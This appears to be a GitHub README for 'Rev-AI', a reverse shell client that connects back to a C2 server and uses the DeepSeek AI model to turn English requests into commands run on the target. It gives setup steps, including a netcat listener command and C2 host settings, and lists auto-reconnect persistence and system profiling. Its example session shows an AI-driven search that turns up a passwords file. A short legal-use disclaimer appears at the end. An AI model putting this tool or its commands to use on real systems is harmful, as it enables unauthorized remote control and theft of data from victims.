🔄 Rev-AI: AI-Powered Reverse Shell Client

📌 Overview
Rev-AI is an intelligent reverse shell client that:

Translates natural language to Linux commands using DeepSeek AI
Maintains persistent connections with automatic reconnection
Provides detailed system diagnostics
Works across multiple operating systems

🚀 Features



Feature
Description



🤖 AI Command Generation
Converts English queries to executable commands


🔧 Cross-Platform
Supports Windows, Linux, and macOS targets


🔒 Secure Communication
Encrypted socket communication with timeouts


🔄 Auto-Reconnect
Resilient connection with configurable retry intervals


💻 System Profiling
Detailed OS/hardware information collection


🧠 Context Memory
Maintains conversation history with AI model


⚙️ Installation
# Clone the repository
git clone https://github.com/yourusername/rev-ai.git
cd rev-ai

# Install dependencies
pip install -r requirements.txt

# Configure environment (create .env file)
echo "RSHELL_HOST=your_server_ip" > .env
echo "RSHELL_PORT=62065" >> .env
echo "DEEPSEEK_API_KEY=your_api_key" >> .env

🛠 Configuration
Environment Variables
# Required
RSHELL_HOST="your_server_ip"  # C2 server IP
DEEPSEEK_API_KEY="sk-..."     # DeepSeek API key

# Optional
RSHELL_PORT=62065             # Connection port
RSHELL_RECONNECT=15           # Reconnect delay (seconds)
RSHELL_TIMEOUT=60             # Socket timeout 
RSHELL_MAX_HISTORY=20         # AI context memory
RSHELL_CONTEXT="context.md"   # AI instructions file

🖥 Usage
1. Start Listener (Server)
nc -lvnp 62065

2. Execute Client (Target)
python rev-ai.py

3. Available Commands
diagnostic            - Show system information
what did i tell you   - View command history
<natural language>    - AI-generated commands

Example Session
> diagnostic
[Windows]
User: admin
Version: Windows-10-10.0.19045
Admin: True

> list all txt files in /documents
TEXT:
[Query] list all txt files in /documents  
[Command] find /documents -name "*.txt" 2>/dev/null
[Output]
/docs/notes.txt
/docs/passwords.txt

⚠️ Security Notice
❗ Legal Use OnlyThis tool is intended for:

Authorized penetration testing
Educational purposes
Legitimate system administration

🔒 Required Precautions:

Obtain explicit written permission before deployment
Use only on systems you own/administrate
Never use for illegal activities

📜 License
MIT License - See LICENSE for full text.
📬 Contact
For security reports or questions:

Email: your@email.com
GitHub Issues: Open Issue


Disclaimer: Authors are not responsible for misuse of this software.
